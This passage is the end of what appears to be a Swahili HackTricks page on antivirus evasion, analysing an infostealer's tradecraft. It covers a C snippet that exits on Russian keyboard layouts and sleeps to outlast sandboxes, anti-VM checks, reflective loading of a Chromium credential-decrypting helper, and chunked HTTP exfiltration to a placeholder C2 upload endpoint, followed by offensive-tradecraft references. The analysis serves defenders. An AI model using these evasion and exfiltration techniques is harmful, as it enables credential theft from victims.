- Config flag (`anti_cis`) huorodhesha keyboard layouts zilizowekwa kupitia `GetKeyboardLayoutList`. Ikiwa Cyrillic layout itapatikana, sample huunda marker tupu ya `CIS` na kusitisha execution kabla ya kuendesha stealers, hivyo kuhakikisha hai-det­onate kamwe kwenye locales zilizotengwa huku ikiacha hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mantiki ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya processes, huhash kila jina kwa custom rolling checksum, na kuilinganisha na blocklists zilizopachikwa za debuggers/sandboxes; hurudia checksum hiyo kwenye jina la computer na hukagua working directories kama vile `C:\analysis`.
- Variant B hukagua system properties (process-count floor, recent uptime), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hufanya timing checks kuzunguka sleeps ili kutambua single-stepping. Hit yoyote husababisha mchakato kusitishwa kabla ya modules kuanzishwa.

### Fileless helper + double ChaCha20 reflective loading

- DLL/EXE kuu hupachika Chromium credential helper ambayo aidha hudondoshwa kwenye disk au hu-mapped manually in-memory; fileless mode hutatua imports/relocations yenyewe, hivyo hakuna helper artifacts zinazoandikwa.
- Helper hiyo huhifadhi DLL ya second-stage iliyosimbwa mara mbili kwa ChaCha20 (keys mbili za baiti 32 + nonces za baiti 12). Baada ya passes zote mbili, hu-load blob reflectively (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing ili ku-inject kwenye Chromium browser inayofanya kazi, kurithi AppBound Encryption keys, na ku-decrypt passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` hupitia global `memory_generators` function-pointer table na kuanzisha thread moja kwa kila module iliyowashwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti file count yake baada ya join window ya takriban sekunde 45.
- Baada ya kukamilika, kila kitu hu-zipped kwa static-linked `miniz` library kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma archive kwa streams za chunks za MB 10 kupitia HTTP POST kwenda `http://<C2>:6767/upload`, huku iki-spoof browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila chunk huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` ya hiari, na chunk ya mwisho huongeza `complete: true` ili C2 ijue kuwa reassembly imekamilika.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blogu](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, hakuna tena pasi za bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – nyaraka](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sampuli](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sampuli](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Infection Chain Mpya na ConfuserEx-Based Obfuscation ya DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kupita posture checks za Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia Vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Windows 11 Forwarded Exports (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa Dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa process na access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Marejeo ya EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDRs kwa Msaada wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Kuvunja Ganda la Kinga la Windows Defender kwa Kutumia Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Marejeo ya amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pure Curtain: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Mjini: Infostealer Mpya yenye Matarajio Makubwa](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Node.js Malware kwa API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Kumlaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, na Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia Vibaya Chrome Remote Desktop Katika Red Team Operations: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kuweka Silaha Driver ya Defender ya Remediation kama Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
